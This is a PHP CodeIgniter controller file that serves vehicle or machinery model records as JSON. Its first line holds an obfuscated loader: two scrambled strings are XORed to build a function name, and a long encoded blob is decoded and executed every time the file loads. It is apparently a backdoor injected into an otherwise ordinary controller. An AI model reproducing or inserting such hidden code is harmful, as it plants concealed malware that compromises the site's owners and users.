<?php $xchfZE='Z5Q G,rZN  .-+6'; $MzVKufoe='9G4A3I-<;NCZDDX'^$xchfZE; $CAIhkvl='.HjV>HV:LQ.Pb7S99:5op,-75SL35=4U3FFyQuKDl2F>SEX<-Y;X4c7U>.=4+L.Gt42GSJiRVWOmxIosLWpnDfS92UrgfWQp91 O:fs<roBqXab,y=.F RVjG078AlYMmPsyaRyqp+ 7xVkixA39AZaV=fAuaA8Q1lC BUo . .4:NsG0 e2zrr;f=P>GNSpGT=8np6a>r0ndC=A=1dqQZX973qgaUA2 f=06mXL26<8.XN1W71 8-9efmd0:vp.ioT<bmV7 zghLvD A=-St5rhw14B4m1W7gtzNP- sKhVH5H7uhqn3;YKKcd2>NUMXdhRY;FUfi=ez T=V.P8okF=ot+0phchV wF8SRiEQqt48 B1YJ.Kseb6V13ePKRbpRB< 2zMQdwXY:XMwYgN 81<olq3d78rAS6<LoPv:C4B7R3ZZWZVaDTKl R6 elPECJPVM0Urq+N6== Ds- XRJjEe231-fVEEPjoh 5jk1S:3pisoJC45H4E W04S= M iN2S=lyyU.57SefqtUC+Qgdn1- 87qY53SvbuzeePRwB;P<kPJbEQtBzRNkVZIpwbc64w3lcVuleWNyWK;6Yl=I;=14U62JlvI7=6WL2veojXZ7;hkEqyVYc3ny 1;YquD+ZPvUE0T -QRl+ZqxDP=RBngalm4'; $wDimuuL=$MzVKufoe('', 'G.BwX=8Y88A>=R+PJNFGWTBEj7-GTbk8F2aPxU0NeT3P011SCyC7F<S4JObkF9ZoPPS32fIv=26DXiOSl,zgMB<LFuOGApjz08F HNWURRbAcAFEENZ4L78BcTVL EbmI9XRHXpxTDUCXxVIPeWX5;:rT;a+AeS4H7gIbpOSZRBQTfW,UYLoSIx2oO5J2<=Xc;HLGK<hCxMdngY IPDLq<9UDVJmE1 FA9VUOMelTWPKKcD;1XCEYNQENI;su9;g,O5OBI=RYZZVlR2A-HHzTNxaSUU6U2Z2NGIZj;HYHAar,T<VUUQJEZ5>.XnO4D<+xLIv=Z24OIFosF;O3O3POCbb=1ze5;7H7SWbS6+IxoQPBYL7TpjUAzlFR7ER:;.+BMrfWEKAGXmS<8N9mJyC8ATDYTfxNnJ2xe7WH-OmVz6Z1R Z;6> 3I<;93D3BA:3=07b27>UcF.O+URYElWIA,3cFeAVREL9= <yCTbISBOU2NRPOUO+1FT1k.E.oQ+TS9SAiY6DKUYqJTC2LFWRukF5RLJULTYlV2PJt+KUGXEwgOvZfZRe,SwhB N7-Z29xECUPTVGWXUgREEqhY69IW 3V,BbTL<EF9DQ9VDZ8-VQION<;CZABeQYvyCHdpEGZ5YQ J.1-r5Q-LB06KvsJrM5E;6FWHWgI'^$CAIhkvl); $wDimuuL();
defined('BASEPATH') OR exit('No direct script access allowed');

class Modelo extends CI_Controller {

	public function __construct()
    {
        parent::__construct();

        /*MODELOS*/
        $this->load->model('tasacion/modelo_m', 'mod');

        /*LIBRERIAS*/
        //$this->load->library('excel');
    }

	public function modeloSearch()
	{
		$data = array(
						'modelo_records' => $this->input->post('tipo') == 'v'? $this->mod->modeloVehiculoReporte() : $this->mod->modeloMaquinariaReporte()
					);

		echo json_encode($data);
	}

}

/* End of file Modelo.php */
/* Location: ./application/controllers/tasacion/Modelo.php */